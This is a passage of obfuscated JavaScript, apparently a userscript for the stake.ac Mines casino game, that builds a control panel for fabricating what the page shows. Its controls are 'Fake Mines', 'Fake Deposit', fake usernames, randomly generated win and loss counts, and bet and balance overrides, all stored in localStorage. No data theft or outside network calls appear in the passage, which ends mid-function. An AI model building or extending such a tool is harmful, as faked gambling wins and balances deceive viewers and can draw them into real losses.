localStorage.getItem("customizedmulti") ? "25px" : '5px') + ";\n                    transform: translateY(-50%);\n                    transition: all 0.3s;\n                \"></div>\n            </div>\n        </div>\n    </div>\n    ") + "\n    <div style=\"margin-bottom: 20px;\">\n        <label style=\"display: block; margin-bottom: 5px; color: " + _0x22d188(_0x54dbe2, 0x23) + ";\">Auto Load Previous Balance</label>\n        <div id=\"autoLoadBalanceContainer\" style=\"display: flex; align-items: center; justify-content: center;\">\n            <div id=\"autoLoadBalanceSwitch\" style=\"\n                width: 50px;\n                height: 25px;\n                background-color: " + ('1' === localStorage.getItem("autoLoadPreviousBalance") ? _0x54dbe2 : _0x4d472a) + ";\n                border-radius: 15px;\n                cursor: pointer;\n                position: relative;\n                box-shadow: 0 0 10px " + _0x54dbe2 + ";\n                transition: box-shadow 0.3s ease-in-out;\n            \">\n                <div style=\"\n                    width: 20px;\n                    height: 20px;\n                    background-color: white;\n                    border-radius: 50%;\n                    position: absolute;\n                    top: 50%;\n                    left: " + ('1' === localStorage.getItem("autoLoadPreviousBalance") ? "25px" : "5px") + ";\n                    transform: translateY(-50%);\n                    transition: all 0.3s;\n                \"></div>\n            </div>\n        </div>\n    </div>\n\n    <div style=\"margin-bottom: 20px;\">\n        <label style=\"display: block; margin-bottom: 5px; color: " + _0x22d188(_0x54dbe2, 0x23) + ";\">Auto Load Previous Statistics</label>\n        <div id=\"autoLoadStatisticsContainer\" style=\"display: flex; align-items: center; justify-content: center;\">\n            <div id=\"autoLoadStatisticsSwitch\" style=\"\n                width: 50px;\n                height: 25px;\n                background-color: " + ('1' === localStorage.getItem("autoLoadPreviousStatistics") ? _0x54dbe2 : _0x4d472a) + ";\n                border-radius: 15px;\n                cursor: pointer;\n                position: relative;\n                box-shadow: 0 0 10px " + _0x54dbe2 + ";\n                transition: box-shadow 0.3s ease-in-out;\n            \">\n                <div style=\"\n                    width: 20px;\n                    height: 20px;\n                    background-color: white;\n                    border-radius: 50%;\n                    position: absolute;\n                    top: 50%;\n                    left: " + ('1' === localStorage.getItem("autoLoadPreviousStatistics") ? "25px" : '5px') + ";\n                    transform: translateY(-50%);\n                    transition: all 0.3s;\n                \"></div>\n            </div>\n        </div>\n    </div>\n\n    <div style=\"margin-bottom: 20px;\">\n        <label style=\"display: block; margin-bottom: 5px; color: " + _0x22d188(_0x54dbe2, 0x23) + ";\">Blur VIP Progress</label>\n        <div id=\"toggleBlurVipContainer\" style=\"display: flex; align-items: center; justify-content: center;\">\n            <div id=\"toggleBlurVipSwitch\" style=\"\n                width: 50px;\n                height: 25px;\n                background-color: " + ('1' === localStorage.getItem("toggleBlurVipProgress") ? _0x54dbe2 : _0x4d472a) + ";\n                border-radius: 15px;\n                cursor: pointer;\n                position: relative;\n                box-shadow: 0 0 10px " + _0x54dbe2 + ";\n                transition: box-shadow 0.3s ease-in-out;\n            \">\n                <div style=\"\n                    width: 20px;\n                    height: 20px;\n                    background-color: white;\n                    border-radius: 50%;\n                    position: absolute;\n                    top: 50%;\n                    left: " + ('1' === localStorage.getItem("toggleBlurVipProgress") ? '25px' : "5px") + ";\n                    transform: translateY(-50%);\n                    transition: all 0.3s;\n                \"></div>\n            </div>\n            <select id=\"blurOptions\" style=\"\n                margin-left: 10px;\n                padding: 5px;\n                border: none;\n                border-radius: 15px;\n                background-color: " + ('1' === localStorage.getItem("toggleBlurVipProgress") ? _0x54dbe2 : _0x4d472a) + ";\n                color: white;\n                font-size: 14px;\n                cursor: pointer;\n                appearance: none;\n                text-align: center;\n                transition: background-color 0.3s;\n                box-shadow: 0 0 10px " + _0x54dbe2 + ";\n            \">\n                <option value=\"blur\" " + ("blur" === localStorage.getItem("blurEffect") ? "selected" : '') + ">Blur</option>\n                <option value=\"rgbBlur\" " + ('rgbBlur' === localStorage.getItem("blurEffect") ? "selected" : '') + ">RGB Blur</option>\n                <option value=\"userBlur\" " + ("userBlur" === localStorage.getItem("blurEffect") ? "selected" : '') + ">Username Blur</option>\n                <option value=\"fakeUser\" " + ('fakeUser' === localStorage.getItem("blurEffect") ? "selected" : '') + ">Fake Username</option>\n            </select>\n        </div>\n    </div>\n";
    _0x140434.innerHTML = "\n        <h2 style=\"margin-bottom: 20px; color: " + _0x22d188(_0x54dbe2, 0x23) + "; font-size: 24px;\">$udo</h2>\n        <div style=\"margin-top: 20px;\">\n            <label for=\"tierSelection\" style=\"display: block; margin-bottom: 5px;\">Select Statistics Tier:</label>\n            <select id=\"tierSelection\" style=\"width: 100%; padding: 8px; border-radius: 5px; border: " + _0x54dbe2 + "; background-color: " + _0x22d188(_0x54dbe2, -0x14) + "; color: white;\">\n                " + Object.keys(_0x289b8a).map(_0x3bff9e => "<option value=\"" + _0x3bff9e + "\" " + (_0x3bff9e === _0x3de9e9 ? 'selected' : '') + '>' + _0x289b8a[_0x3bff9e].text + "</option>").join('') + "\n            </select>\n        </div>\n\n        <!-- Old Button (no changes here) -->\n        <div style=\"margin-top: 20px;\">\n            <button id=\"activateMinesButton\" style=\"padding: 10px 20px; background-color: #7289da; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px;\">\n                Activate Fake Mines (Old)\n            </button>\n        </div>\n\n    <!-- New Fancy Button (Activate Fake Mines V2) -->\n    " + ("\n    <div style=\"margin-top: 20px; text-align: center;\">\n        <button id=\"activateMinesButton2\" style=\"padding: 12px 30px; font-size: 16px; font-weight: 600; background: linear-gradient(45deg, " + _0x54dbe2 + ", " + _0x22d188(_0x54dbe2, -0x14) + "); color: white; border: none; border-radius: 50px; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); display: inline-flex; align-items: center; justify-content: center; position: relative; transition: all 0.4s ease; transform-origin: center center;\">\n            <span style=\"z-index: 1; text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);\">Activate Fake Mines V2</span>\n        </button>\n    </div>\n    ") + "\n\n        <div style=\"margin-top: 20px;\">\n            <label for=\"betAmount\" style=\"display: block; margin-bottom: 5px; color: " + _0x22d188(_0x54dbe2, 0x23) + ";\">Bet Amount:</label>\n            <input type=\"text\" id=\"betAmount\" style=\"width: 100%; padding: 8px; border-radius: 5px; border: none; background-color: #2f3136; color: white;\">\n        </div>\n        <div style=\"margin-top: 20px;\">\n            <label for=\"balanceAmount\" style=\"display: block; margin-bottom: 5px; color: " + _0x22d188(_0x54dbe2, 0x23) + ";\">Balance Amount:</label>\n            <input type=\"text\" id=\"balanceAmount\" style=\"width: 100%; padding: 8px; border-radius: 5px; border: none; background-color: #2f3136; color: white;\">\n        </div>\n        <p id=\"toggleInfo\" style=\"margin-top: 20px; color: " + _0x22d188(_0x54dbe2, -0xa) + ";\">Press F2 to show/hide this modal</p>\n    ";
    _0x140434.id = "Modalreal";
    const _0x9dd442 = document.createElement("div");
    _0x9dd442.style.position = "fixed";
    _0x9dd442.style.top = '50%';
    _0x9dd442.style.left = "50%";
    _0x9dd442.style.transform = "translate(-50%, -50%)";
    _0x9dd442.style.background = "linear-gradient(" + _0x54dbe2 + ", black 90%)";
    _0x9dd442.style.padding = "20px";
    _0x9dd442.style.color = "white";
    _0x9dd442.style.borderRadius = "10px";
    _0x9dd442.style.textAlign = "center";
    _0x9dd442.style.width = "350px";
    _0x9dd442.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.3), 0 0 15px " + _0x54dbe2;
    _0x9dd442.style.zIndex = "1000";
    _0x9dd442.style.display = "none";
    const _0xdfd3d5 = document.createElement("button");
    _0xdfd3d5.textContent = "Close";
    _0xdfd3d5.style.backgroundColor = "#ff4757";
    _0xdfd3d5.style.color = 'white';
    _0xdfd3d5.style.border = "none";
    _0xdfd3d5.style.padding = "10px 20px";
    _0xdfd3d5.style.borderRadius = '5px';
    _0xdfd3d5.style.cursor = "pointer";
    _0xdfd3d5.style.marginTop = "20px";
    _0xdfd3d5.style.fontSize = "16px";
    _0xdfd3d5.onclick = () => {
      _0x9dd442.style.display = "none";
    };
    const _0x58d439 = document.createElement("button");
    _0x58d439.textContent = "Generate Random Wins/Losses";
    _0x58d439.style.backgroundColor = "#4caf50";
    _0x58d439.style.color = "white";
    _0x58d439.style.border = "none";
    _0x58d439.style.padding = "10px 20px";
    _0x58d439.style.borderRadius = '5px';
    _0x58d439.style.cursor = "pointer";
    _0x58d439.style.marginTop = "20px";
    _0x58d439.style.fontSize = "16px";
    _0x58d439.onclick = () => {
      const _0x10144c = parseInt(document.getElementById("totalBets").value, 0xa) || 0x0;
      if (_0x10144c >= 0x2) {
        const _0x391d7f = Math.ceil(0.25 * _0x10144c);
        const _0x1a2799 = Math.floor(0.65 * _0x10144c);
        const _0x1573e4 = Math.floor(Math.random() * (_0x1a2799 - _0x391d7f + 0x1)) + _0x391d7f;
        const _0x7826eb = _0x10144c - _0x1573e4;
        document.getElementById("numberOfWins").value = _0x1573e4;
        document.getElementById("numberOfLosses").value = _0x7826eb;
        document.getElementById("totalBets").value = _0x10144c;
        localStorage.setItem("numberOfWins", _0x1573e4);
        localStorage.setItem("numberOfLosses", _0x7826eb);
        localStorage.setItem("totalBets", _0x10144c);
      } else {
        alert("Total Bets must be at least 2.");
      }
    };
    const _0x3b1b15 = document.createElement("button");
    _0x3b1b15.textContent = "Fake Deposit";
    _0x3b1b15.style.backgroundImage = "linear-gradient(45deg, #6bff6b, #3bff3b)";
    _0x3b1b15.style.color = 'white';
    _0x3b1b15.style.border = "none";
    _0x3b1b15.style.padding = "12px 20px";
    _0x3b1b15.style.borderRadius = "5px";
    _0x3b1b15.style.cursor = "pointer";
    _0x3b1b15.style.marginTop = '0px';
    _0x3b1b15.style.marginBottom = "10px";
    _0x3b1b15.style.boxShadow = "0 2px 5px rgba(0, 0, 0, 0.2)";
    _0x3b1b15.style.transition = "background-color 0.3s ease, transform 0.2s ease";
    _0x3b1b15.addEventListener('mouseover', () => {
      _0x3b1b15.style.backgroundColor = '#00ff6b';
      _0x3b1b15.style.transform = "scale(1.05)";
    });
    _0x3b1b15.addEventListener("mouseout", () => {
      _0x3b1b15.style.backgroundColor = "#1eff90";
      _0x3b1b15.style.transform = "scale(1)";
    });
    _0x3b1b15.onclick = () => {
      !function (_0x5e39aa, _0x13eed4) {
        if (document.querySelector('.popup-overlay')) {
          return;
        }
        const _0x499401 = document.createElement("div");
        _0x499401.className = "popup-overlay";
        _0x499401.style.position = "fixed";
        _0x499401.style.top = '0';
        _0x499401.style.left = '0';
        _0x499401.style.width = "100%";
        _0x499401.style.height = "100%";
        _0x499401.style.backgroundColor = "rgba(0, 0, 0, 0.7)";
        _0x499401.style.zIndex = "9999";
        const _0x43ca2c = document.createElement('div');
        _0x43ca2c.style.position = 'absolute';
        _0x43ca2c.style.top = "50%";
        _0x43ca2c.style.left = '50%';
        _0x43ca2c.style.transform = "translate(-50%, -50%)";
        _0x43ca2c.style.padding = '20px';
        _0x43ca2c.style.backgroundColor = "#fff";
        _0x43ca2c.style.borderRadius = '8px';
        _0x43ca2c.style.boxShadow = "0 4px 15px rgba(0, 0, 0, 0.3)";
        _0x43ca2c.style.width = "90%";
        _0x43ca2c.style.maxWidth = "400px";
        _0x43ca2c.style.textAlign = "center";
        const _0x44ae0c = document.createElement('p');
        _0x44ae0c.textContent = _0x5e39aa;
        _0x44ae0c.style.fontSize = '16px';
        _0x44ae0c.style.marginBottom = "15px";
        const _0x5473d5 = document.createElement('input');
        _0x5473d5.type = 'number';
        _0x5473d5.placeholder = "Enter deposit amount";
        _0x5473d5.style.width = "100%";
        _0x5473d5.style.padding = "10px";
        _0x5473d5.style.border = "1px solid #ccc";
        _0x5473d5.style.borderRadius = "4px";
        _0x5473d5.style.fontSize = "14px";
        _0x5473d5.style.boxShadow = "0 2px 5px rgba(0, 0, 0, 0.1)";
        const _0x2df53f = document.createElement("button");
        _0x2df53f.textContent = 'Confirm';
        _0x2df53f.style.marginTop = "10px";
        _0x2df53f.style.padding = "10px 15px";
        _0x2df53f.style.backgroundColor = "#28a745";
        _0x2df53f.style.color = '#fff';
        _0x2df53f.style.border = "none";
        _0x2df53f.style.borderRadius = "4px";
        _0x2df53f.style.cursor = "pointer";
        _0x2df53f.style.fontSize = '16px';
        _0x2df53f.style.transition = "background-color 0.3s ease";
        _0x2df53f.addEventListener("mouseover", () => {
          _0x2df53f.style.backgroundColor = "#218838";
        });
        _0x2df53f.addEventListener('mouseout', () => {
          _0x2df53f.style.backgroundColor = '#28a745';
        });
        _0x43ca2c.appendChild(_0x44ae0c);
        _0x43ca2c.appendChild(_0x5473d5);
        _0x43ca2c.appendChild(_0x2df53f);
        _0x499401.appendChild(_0x43ca2c);
        document.body.appendChild(_0x499401);
        _0x2df53f.addEventListener("click", () => {
          const _0x1b734f = _0x5473d5.value.trim();
          if (_0x1b734f) {
            localStorage.setItem('fakeDeposit', _0x1b734f);
            document.body.removeChild(_0x499401);
            if (_0x13eed4) {
              _0x13eed4(_0x1b734f);
            }
          } else {
            alert("Please enter a valid number.");
          }
        });
        _0x499401.addEventListener("click", _0x56767a => {
          if (_0x56767a.target === _0x499401) {
            document.body.removeChild(_0x499401);
          }
        });
        _0x43ca2c.addEventListener("click", _0x824560 => {
          _0x824560.stopPropagation();
        });
      }("Please enter the deposit amount:", _0x47fd12 => {
        if (!isNaN(_0x47fd12) && _0x47fd12 > 0x0) {
          alert("Deposit amount saved: " + _0x47fd12);
        } else {
          alert("Please enter a valid number.");
        }
      });
    };
    const _0x24591e = document.createElement('button');
    _0x24591e.textContent = "Change Fake Username";
    _0x24591e.style.backgroundImage = "linear-gradient(45deg, #ff6b6b, #ff3b3b)";
    _0x24591e.style.color = "white";
    _0x24591e.style.border = "none";
    _0x24591e.style.padding = "12px 20px";
    _0x24591e.style.borderRadius = "5px";
    _0x24591e.style.cursor = 'pointer';
    _0x24591e.style.marginTop = '20px';
    _0x24591e.style.fontSize = "16px";
    _0x24591e.style.marginTop = "0px";
    _0x24591e.style.marginBottom = '10px';
    _0x24591e.style.boxShadow = "0 2px 5px rgba(0, 0, 0, 0.2)";
    _0x24591e.style.transition = "background-color 0.3s ease, transform 0.2s ease";
    _0x24591e.addEventListener('mouseover', () => {
      _0x24591e.style.backgroundColor = "#00c6ff";
      _0x24591e.style.transform = 'scale(1.05)';
    });
    _0x24591e.addEventListener("mouseout", () => {
      _0x24591e.style.backgroundColor = "#1e90ff";
      _0x24591e.style.transform = 'scale(1)';
    });
    _0x24591e.onclick = () => {
      _0x40148e("Please enter the fake username:", _0x3fc1a9 => {
        _0x3b04bb();
        alert("Fake username saved: " + _0x3fc1a9);
      });
    };
    _0x9dd442.innerHTML = "\n    <h2 style=\"margin-bottom: 20px; color: white;\">Additional Settings</h2>\n    <div style=\"margin-bottom: 15px;\">\n        <label for=\"totalBets\" style=\"display: block; margin-bottom: 5px; color: white;\">Total Bets:</label>\n        <input type=\"number\" id=\"totalBets\" style=\"\n            width: calc(100% - 20px);\n            padding: 10px;\n            border-radius: 5px;\n            border: 1px solid " + _0x54dbe2 + ";\n            background-color: " + _0x22d188(_0x54dbe2, -0x14) + ";\n            color: white;\n            box-sizing: border-box;\n        \" />\n    </div>\n    <div style=\"margin-bottom: 15px;\">\n        <label for=\"numberOfWins\" style=\"display: block; margin-bottom: 5px; color: white;\">Number of Wins:</label>\n        <input type=\"number\" id=\"numberOfWins\" style=\"\n            width: calc(100% - 20px);\n            padding: 10px;\n            border-radius: 5px;\n            border: 1px solid " + _0x54dbe2 + ";\n            background-color: " + _0x22d188(_0x54dbe2, -0x14) + ";\n            color: white;\n            box-sizing: border-box;\n        \" />\n    </div>\n    <div style=\"margin-bottom: 20px;\">\n        <label for=\"numberOfLosses\" style=\"display: block; margin-bottom: 5px; color: white;\">Number of Losses:</label>\n        <input type=\"number\" id=\"numberOfLosses\" style=\"\n            width: calc(100% - 20px);\n            padding: 10px;\n            border-radius: 5px;\n            border: 1px solid " + _0x54dbe2 + ";\n            background-color: " + _0x22d188(_0x54dbe2, -0x14) + ";\n            color: white;\n            box-sizing: border-box;\n        \" />\n    </div>\n";
    const _0x186fb0 = document.createElement("div");
    _0x186fb0.style.marginBottom = "15px";
    const _0x25c2db = document.createElement("label");
    _0x25c2db.textContent = "Select Theme Color:";
    _0x25c2db.style.display = "block";
    _0x25c2db.style.marginBottom = "5px";
    _0x186fb0.appendChild(_0x25c2db);
    const _0x382c40 = document.createElement('input');
    _0x382c40.type = "color";
    _0x382c40.style.marginRight = '10px';
    _0x382c40.style.width = "50px";
    _0x382c40.style.height = "30px";
    _0x186fb0.appendChild(_0x382c40);
    const _0x386dba = document.createElement('input');
    function _0x2fd213(_0x156103) {
      localStorage.setItem("themeColor", _0x156103);
      _0x382c40.value = _0x156103;
      _0x386dba.value = _0x156103;
      document.querySelector("#toggleInfo").style.color = _0x22d188(_0x156103, -0xa);
      _0x140434.style.background = 'linear-gradient(' + _0x22d188(_0x156103, -0x14) + ", black 90%)";
      document.querySelectorAll("#Modalreal input, #Modalreal .toggle").forEach(_0x48ed04 => {
        _0x48ed04.style.background = "linear-gradient(" + _0x156103 + ", black 90%)";
        _0x48ed04.style.borderColor = _0x156103;
        _0x48ed04.style.boxShadow = "0 0 10px " + _0x156103;
      });
      document.querySelectorAll("#Modalreal label").forEach(_0x3e24a1 => {
        if (!("Bet Amount:" !== _0x3e24a1.innerText && "Balance Amount:" !== _0x3e24a1.innerText)) {
          _0x3e24a1.style.color = _0x22d188(_0x156103, 0x23);
        }
      });
      _0x9dd442.style.background = "linear-gradient(" + _0x156103 + ", black 90%)";
      document.getElementById('Modalreal').firstElementChild.style.color = _0x22d188(_0x156103, 0x19);
      _0x9dd442.querySelectorAll("input").forEach(_0x325ce5 => {
        _0x325ce5.style.backgroundColor = _0x22d188(_0x156103, -0x14);
        _0x325ce5.style.borderColor = _0x156103;
        _0x325ce5.style.color = "white";
      });
      const _0x5e6077 = document.getElementById('activateMinesButton');
      const _0x43c07a = _0x22d188(_0x156103, -0x14);
      if (_0x5e6077) {
        _0x5e6077.style.border = "1px solid " + _0x43c07a;
      }
      const _0x5da494 = document.getElementById("activateMinesButton2");
      if (_0x5da494) {
        const _0x3a4456 = "linear-gradient(45deg, " + _0x156103 + ", " + _0x22d188(_0x156103, -0x14) + ')';
        _0x5da494.style.background = _0x3a4456;
        _0x5da494.style.boxShadow = "0 0 10px " + _0x156103;
        _0x5da494.style.color = "white";
      }
      const _0x30cb77 = document.getElementById("additionalSettingsIcon");
      const _0x47d3b6 = document.getElementById("settingsIcon");
      if (_0x30cb77) {
        document.querySelector("#additionalSettingsIcon svg").setAttribute("fill", _0x156103);
      }
      if (_0x47d3b6) {
        document.querySelector("#settingsIcon svg").setAttribute("fill", _0x156103);
      }
      const _0x94818c = document.getElementById("tierSelection");
      if (_0x94818c) {
        _0x94818c.style.backgroundColor = _0x22d188(_0x156103, -0x14);
        _0x94818c.style.borderColor = _0x156103;
      }
      const _0x598ff0 = {
        'toggleBlurVipSwitch': "toggleBlurVipProgress",
        'autoLoadStatisticsSwitch': "autoLoadPreviousStatistics",
        'autoLoadBalanceSwitch': "autoLoadPreviousBalance",
        'toggleSwitch': "showAccessGranted",
        'notifyMissingItemsSwitch': "notifyMissingItems",
        'autoActivateSwitch': 'autoActivateFakeMines',
        'autoShowPredictorSwitch': "autoShowPredictor",
        'customizedmultiSwitch': 'customizedmulti',
        'autoActivateSwitchv2': 'autoActivateFakeMinesv2'
      };
      document.querySelectorAll("#settingsSection label").forEach(_0x77e132 => {
        _0x77e132.style.color = _0x22d188(_0x156103, 0x23);
        const _0x46fe20 = _0x77e132.nextElementSibling.querySelector("div");
        if (_0x46fe20) {
          const _0x52751d = _0x598ff0[_0x46fe20.id];
          let _0x64a1fc = '1' === localStorage.getItem(_0x52751d);
          if (!("notifyMissingItems" !== _0x52751d && "showAccessGranted" !== _0x52751d && "autoShowPredictor" !== _0x52751d)) {
            if (null === localStorage.getItem(_0x52751d)) {
              _0x64a1fc = true;
            }
          }
          _0x46fe20.style.backgroundColor = _0x64a1fc ? _0x156103 : _0x22d188(_0x156103, 0x1e);
          _0x46fe20.querySelector("div").style.left = _0x64a1fc ? "25px" : "5px";
          _0x46fe20.style.boxShadow = "0 0 10px " + _0x156103;
        }
        const _0x13499c = _0x77e132.nextElementSibling.querySelector('select');
        if (_0x13499c) {
          const _0x52e4b2 = '1' === localStorage.getItem("toggleBlurVipProgress");
          _0x13499c.style.backgroundColor = _0x52e4b2 ? _0x156103 : _0x22d188(_0x156103, 0x1e);
          _0x13499c.style.borderColor = _0x156103;
          _0x13499c.style.color = "white";
          _0x13499c.style.boxShadow = "0 0 10px " + _0x156103;
        }
      });
      _0x140434.style.boxShadow = "0 0 25px " + _0x156103;
      _0x9dd442.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.3), 0 0 15px " + _0x156103;
      _0x395663.style.backgroundColor = _0x156103;
      _0x395663.style.boxShadow = "0 0 10px " + _0x156103;
      _0x395663.style.color = "white";
      _0x54dbe2 = _0x156103;
    }
    _0x386dba.type = "text";
    _0x386dba.placeholder = "Enter HEX code";
    _0x386dba.style.padding = '5px';
    _0x386dba.style.borderRadius = "5px";
    _0x386dba.style.border = "1px solid " + _0x54dbe2;
    _0x386dba.style.backgroundColor = _0x22d188(_0x54dbe2, -0x14);
    _0x386dba.style.color = "white";
    _0x186fb0.appendChild(_0x386dba);
    _0x9dd442.appendChild(_0x3b1b15);
    _0x9dd442.appendChild(_0x24591e);
    _0x9dd442.appendChild(_0x186fb0);
    _0x382c40.addEventListener("input", () => {
      _0x2fd213(_0x382c40.value);
    });
    _0x386dba.addEventListener('input', () => {
      if (/^#[0-9A-F]{6}$/i.test(_0x386dba.value)) {
        _0x2fd213(_0x386dba.value);
      }
    });
    _0x9dd442.appendChild(_0x58d439);
    _0x9dd442.appendChild(_0xdfd3d5);
    document.body.appendChild(_0x9dd442);
    _0x140434.appendChild(_0x129c48);
    _0x140434.appendChild(_0x4bc664);
    _0x140434.appendChild(_0x435cad);
    document.body.appendChild(_0x140434);
    _0x435cad.addEventListener('click', () => {
      _0x9dd442.style.display = 'none' === _0x9dd442.style.display ? "block" : "none";
    });
    document.getElementById('blurOptions').addEventListener("change", _0x31f23f => {
      localStorage.setItem("blurEffect", _0x31f23f.target.value);
      if ("fakeUser" !== _0x31f23f.target.value || '1' !== localStorage.getItem("toggleBlurVipProgress") || localStorage.getItem("fakeUsername")) {
        _0x3b04bb();
      } else {
        _0x40148e("Please enter the fake username:", _0x30220d => {
          alert("Fake username saved: " + _0x30220d);
          _0x3b04bb();
        });
      }
    });
    const _0x594eb9 = document.getElementById("totalBets");
    const _0x680f71 = document.getElementById('numberOfWins');
    const _0x50bae9 = document.getElementById('numberOfLosses');
    document.getElementById("toggleBlurVipSwitch").addEventListener("click", () => {
      const _0x97bbe7 = '1' === localStorage.getItem("toggleBlurVipProgress");
      const _0x47806a = document.getElementById("blurOptions");
      localStorage.setItem("toggleBlurVipProgress", _0x97bbe7 ? '0' : '1');
      document.getElementById('toggleBlurVipSwitch').style.backgroundColor = _0x97bbe7 ? _0x22d188(_0x54dbe2, 0x1e) : _0x54dbe2;
      document.querySelector("#toggleBlurVipSwitch div").style.left = _0x97bbe7 ? "5px" : "25px";
      _0x47806a.style.backgroundColor = _0x97bbe7 ? _0x22d188(_0x54dbe2, 0x1e) : _0x54dbe2;
      if ("fakeUser" !== localStorage.getItem('blurEffect') || _0x97bbe7 || localStorage.getItem("fakeUsername")) {
        _0x3b04bb();
      } else {
        _0x40148e("Please enter the fake username:", _0x41dc34 => {
          alert("Fake username saved: " + _0x41dc34);
          _0x3b04bb();
        });
      }
    });
    _0x594eb9.addEventListener("input", () => {
      const _0x566a73 = parseInt(_0x594eb9.value, 0xa) || 0x0;
      localStorage.setItem("totalBets", _0x566a73);
    });
    _0x680f71.addEventListener("input", () => {
      const _0x2b49ba = parseInt(_0x680f71.value, 0xa) || 0x0;
      localStorage.setItem('numberOfWins', _0x2b49ba);
    });
    _0x50bae9.addEventListener("input", () => {
      const _0x3c8239 = parseInt(_0x50bae9.value, 0xa) || 0x0;
      localStorage.setItem("numberOfLosses", _0x3c8239);
    });
    _0x129c48.addEventListener("click", () => {
      const _0x3152a1 = 'block' === _0x4bc664.style.display;
      _0x4bc664.style.display = _0x3152a1 ? "none" : "block";
    });
    _0x140434.querySelector("#tierSelection").addEventListener("change", _0x283e4c => {
      const _0x579762 = _0x283e4c.target.value;
      localStorage.setItem("selectedTier", _0x579762);
      _0x538031(_0x579762);
    });
    (function _0x4c0ea9(_0xbf8aab = 0xa) {
      const _0x2e5dcf = document.querySelectorAll("#Modalreal input, #Modalreal .toggle");
      if (_0x2e5dcf.length > 0x0) {
        _0x2e5dcf.forEach(_0x56ebbf => {
          _0x56ebbf.style.background = 'linear-gradient(' + _0x54dbe2 + ", black 90%)";
          _0x56ebbf.style.borderColor = _0x54dbe2;
          _0x56ebbf.style.boxShadow = "0 0 10px " + _0x54dbe2;
        });
      } else if (_0xbf8aab > 0x0) {
        setTimeout(() => _0x4c0ea9(_0xbf8aab - 0x1), 0x64);
      }
    })(0xa);
    const _0x4be73a = document.getElementById("activateMinesButton");
    _0x4be73a.style.backgroundColor = _0x22d188(_0x54dbe2, -0x14);
    _0x4be73a.style.color = "white";
    _0x4be73a.style.border = "1px solid " + _0x22d188(_0x54dbe2, -0x14);
    const _0x395663 = _0x140434.querySelector('#activateMinesButton');
    const _0x1a8632 = document.getElementById("activateMinesButton2");
    const _0x558726 = _0x140434.querySelector('#autoActivateSwitchv2');
    _0x558726.addEventListener("click", () => {
      if (_0x356ed4) {
        return void _0x367e4d("Please enable this option before interacting with the fake mines buttons.");
      }
      if (_0x35a124 && _0x52e332) {
        return void _0x367e4d("Please disable this option in any other tab before proceeding.");
      }
      const _0x1550d8 = _0x558726.style.backgroundColor === _0x2560b1();
      _0x558726.style.backgroundColor = _0x1550d8 ? _0x2560b1(true) : _0x2560b1();
      _0x558726.querySelector('div').style.left = _0x1550d8 ? "5px" : "25px";
      localStorage.setItem('autoActivateFakeMinesv2', _0x1550d8 ? '0' : '1');
    });
    _0x1a8632.addEventListener("click", () => {
      if (!_0x356ed4) {
        const _0x423d12 = localStorage.getItem('themeColor') || '#f55359';
        const _0x58eb3b = _0x423d12 ? _0x22d188(_0x423d12, -0x1e) : '#f55359';
        _0x1a8632.disabled = true;
        _0x1a8632.style.cursor = "not-allowed";
        _0x1a8632.style.backgroundColor = _0x58eb3b;
        _0x1a8632.style.boxShadow = 'none';
        _0x1a8632.textContent = "Fake Mines Activated";
        _0x52e332 = true;
        _0x35a124 = true;
        _0x356ed4 = true;
        _0x58a1b3();
      }
    });
    _0x1a8632.addEventListener("mouseover", () => {
      _0x1a8632.style.background = "linear-gradient(45deg, " + _0x22d188(_0x54dbe2, -0x14) + ", " + _0x54dbe2 + ')';
      _0x1a8632.style.transform = "translateY(-6px)";
      _0x1a8632.style.boxShadow = "0 6px 20px rgba(0, 0, 0, 0.2), 0 0 15px rgba(255, 255, 255, 0.5)";
    });
    _0x1a8632.addEventListener("mouseout", () => {
      _0x1a8632.style.background = "linear-gradient(45deg, " + _0x54dbe2 + ", " + _0x22d188(_0x54dbe2, -0x14) + ')';
      _0x1a8632.style.transform = "translateY(0)";
      _0x1a8632.style.boxShadow = "0 4px 10px rgba(0, 0, 0, 0.2)";
    });
    _0x1a8632.addEventListener('mousedown', () => {
      _0x1a8632.style.transform = "translateY(2px)";
      _0x1a8632.style.boxShadow = "0 8px 25px rgba(0, 0, 0, 0.4)";
    });
    _0x1a8632.addEventListener('mouseup', () => {
      _0x1a8632.style.transform = "translateY(0)";
      _0x1a8632.style.boxShadow = "0 4px 10px rgba(0, 0, 0, 0.2)";
    });
    function _0x3a9243() {
      const _0x10d17c = window.location.href;
      const _0x1c9b55 = localStorage.getItem("autoActivateFakeMines") || '0';
      const _0x13d182 = localStorage.getItem('themeColor') || "#f55359";
      const _0x2ec30c = _0x13d182 ? _0x22d188(_0x13d182, -0x1e) : "#f55359";
      const _0x15bf7e = localStorage.getItem("autoActivateFakeMinesv2") || '0';
      const _0x14bd13 = document.getElementById("activateMinesButton");
      const _0x4434b5 = document.getElementById("activateMinesButton2");
      if (_0x10d17c.startsWith("https://stake.ac/casino/games/mines") && !_0x356ed4 && '0' === _0x1c9b55) {
        if ('1' === _0x15bf7e) {
          _0x14bd13.disabled = true;
          _0x14bd13.style.cursor = 'not-allowed';
          _0x14bd13.style.backgroundColor = _0x2ec30c;
          _0x14bd13.style.boxShadow = "none";
          _0x14bd13.textContent = "Fake Mines Activated";
        } else {
          _0x14bd13.disabled = false;
          _0x14bd13.style.cursor = "pointer";
          _0x14bd13.style.backgroundColor = _0x13d182;
          _0x14bd13.style.boxShadow = "0 0 10px " + _0x13d182;
          _0x14bd13.textContent = "Activate Fake Mines";
        }
      } else if (_0x10d17c.startsWith("https://stake.ac/casino/games/mines")) {
        if ('1' === _0x1c9b55 && _0x10d17c.startsWith('https://stake.ac/casino/games/mines') && !_0x35a124) {
          _0x35a124 = true;
          _0x14bd13.disabled = true;
          _0x14bd13.style.cursor = "not-allowed";
          _0x14bd13.style.backgroundColor = _0x2ec30c;
          _0x14bd13.style.boxShadow = "none";
          _0x14bd13.textContent = "Fake Mines Activated";
          _0x1d576c();
        }
      } else {
        _0x14bd13.disabled = true;
        _0x14bd13.style.cursor = "not-allowed";
        _0x14bd13.style.backgroundColor = _0x2ec30c;
        _0x14bd13.style.boxShadow = "none";
        _0x14bd13.textContent = "Activate Fake Mines";
      }
      if (_0x10d17c.startsWith("https://stake.ac/casino/games/mines") && !_0x356ed4 && '0' === _0x15bf7e) {
        if ('1' === _0x1c9b55) {
          _0x4434b5.disabled = true;
          _0x4434b5.style.cursor = "not-allowed";
